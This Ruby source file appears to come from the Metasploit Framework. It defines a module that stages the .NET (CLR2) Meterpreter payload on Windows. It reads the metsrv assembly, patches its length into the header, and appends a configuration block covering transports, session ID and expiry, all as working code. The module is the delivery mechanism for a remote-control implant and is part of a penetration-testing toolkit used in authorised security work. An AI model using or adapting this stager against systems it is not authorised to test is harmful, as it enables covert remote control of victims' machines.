# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/clr2'
require 'rex/payloads/meterpreter/config'

module Msf

###
#
# Common module stub for ARCH_CLR2 payloads that make use of Meterpreter.
#
###

module Payload::Clr2::MeterpreterLoader

  include Msf::Payload::Clr2

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration for the CLR version of Meterpreter',
      'Description'   => 'Inject Meterpreter & the configuration stub via Assembly loading',
      'Author'        => ['OJ Reeves'],
      'References'    => [
        [ 'URL', 'https://github.com/OJ/clr-meterpreter' ] # History of the payload
      ],
      'Platform'      => 'windows',
      'Arch'          => ARCH_CLR2,
      'PayloadCompat' => {},
      'Stage'         => {}
      ))
  end

  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:              opts[:uuid].arch, # TODO: need to change this down the track
      null_session_guid: opts[:null_session_guid] == true,
      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config] || [transport_config(opts)],
      extensions:        [],
      stageless:         opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    path = MetasploitPayloads.meterpreter_path('metsrv', "net35.dll")
    assembly = ''
    ::File.open(path, 'rb') { |f| assembly = f.read }

    # patch the length of the assembly into the assembly header
    # Skip the 'MZ' part of the header
    assembly[2, 4] = [assembly.length].pack('V')

    assembly
  end

end

end

